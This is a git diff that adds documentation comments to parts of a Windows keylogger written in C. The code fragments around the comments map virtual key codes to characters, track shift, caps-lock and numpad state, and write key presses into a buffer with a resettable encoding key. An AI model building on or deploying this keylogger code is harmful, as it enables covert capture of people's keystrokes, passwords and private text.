@@ -7,6 +7,13 @@ static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode);
 static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s);
 static void createKeyPairs(KEY_LOGGER* kLogger);
 
+
+/**
+ * Initialises a new KEY_LOGGER struct including the key code to 
+ * charatcer mappings
+ * 
+ * @return the newly allocated key loggers address
+ */
 KEY_LOGGER* initKeyLogger() {
     KEY_LOGGER* kLogger = malloc(sizeof(KEY_LOGGER));
     if (kLogger == NULL) { return NULL; }
@@ -31,7 +38,9 @@ KEY_LOGGER* initKeyLogger() {
 
 /**
  * simply go through and cleanup each key pair struct before freeing
- * the keylogger itself
+ * the keylogger itself.
+ * 
+ * @param kLogger the key logger to free
  */
 void keyLoggerCleanup(KEY_LOGGER* kLogger) {
     for (int i = 0; i < NUM_KEYS; i++) {
@@ -41,9 +50,14 @@ void keyLoggerCleanup(KEY_LOGGER* kLogger) {
 }
 
 /**
- * update the state of the boolean keys flags. If shift is down then set it to true, 
+ * Update the state of the boolean keys flags. If shift is down then set it to true, 
  * otherwise set to false. If caps lock or numpad has been pressed then simply 
- * swap the flags 
+ * swap the flags!
+ * 
+ * @param kLogger the key logger whose state we are updating
+ * @param wParam value that specifies the keys state
+ * @param vkCode the code of the key pressed
+ * @return whether the loggers "state" was updated or not
  */
 BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
     // shift has been pressed so update it
@@ -72,6 +86,14 @@ BOOL updateKeyLoggerState(KEY_LOGGER* kLogger, WPARAM wParam, LPDWORD vkCode) {
     return FALSE;
 }
 
+/**
+ * Retrieve the necassary string associated with the key press and
+ * write it to the key loggers buffer
+ * 
+ * @param kLogger the key logger
+ * @param vkCode code of the key pressed
+ * @return whether the operation was successful
+ */
 RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
     KEY_PAIR* kp = kLogger->keyCodes[*vkCode];
     if (kp == NULL) { return R_NULL; }
@@ -103,6 +125,11 @@ RET_CODE addKeyPressToBuffer(KEY_LOGGER* kLogger, LPDWORD vkCode) {
  * and this provides a tiny optimisation. Otherwise, check the special cases:
  *  1. if shift flag is set
  *  2. if numPad is active and VK_NUMPAD0 <= vkCode <= VK_NUMPAD9
+ * 
+ * @param kLogger the curretn key logger
+ * @param kp the key pair struct associated with the key press
+ * @param vkCode the code of the key press
+ * @return the character of the key that was pressed
  */
 static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
     if (*vkCode >= A && *vkCode <= Z) {
@@ -124,6 +151,10 @@ static char getKeyChar(KEY_LOGGER* kLogger, KEY_PAIR* kp, LPDWORD vkCode) {
 /**
  * Manually writes the characters from the string represenation of an
  * unprintable key into the key buffer, returing the appropriate code
+ * 
+ * @param kLogger the key logger to write to
+ * @param s the string to write to the buffer
+ * @return whether it was a successful write
  */
 static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
     // write each char of s into the buffer
@@ -139,8 +170,11 @@ static RET_CODE writeStrToBuffer(KEY_LOGGER* kLogger, char* s) {
 }
 
 /**
- * set the buffer pointer to the start, and set the first character to a null
- * terminator. Also rest the key loggers encoding key to the base key
+ * Set the buffer pointer to the start, and set the first character to a null
+ * terminator. Also reset the key loggers encoding key to the base key
+ * 
+ * @param kLogger
+ * @param key the char to set the encoding key to
  */
 void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key) {
     memset(kLogger->keyBuffer, '\0', MAX_BUFF_LEN);
@@ -149,8 +183,10 @@ void resetKLBufferAndKey(KEY_LOGGER* kLogger, char key) {
 }
 
 /**
- * 
+ * initialise all of the key pairs associated with the vkCodes that we need to log!
  * https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
+ * 
+ * @param kLogger the key logger whose key pairs we are initialising
  */
 static void createKeyPairs(KEY_LOGGER* kLogger) {
     // initialise numpad values
@@ -211,4 +247,3 @@ static void createKeyPairs(KEY_LOGGER* kLogger) {
     kLogger->keyCodes[VK_OEM_6]      = initKeyPair(']', '}', NULL);
     kLogger->keyCodes[VK_OEM_7]      = initKeyPair('\'', '"', NULL);   
 }
-
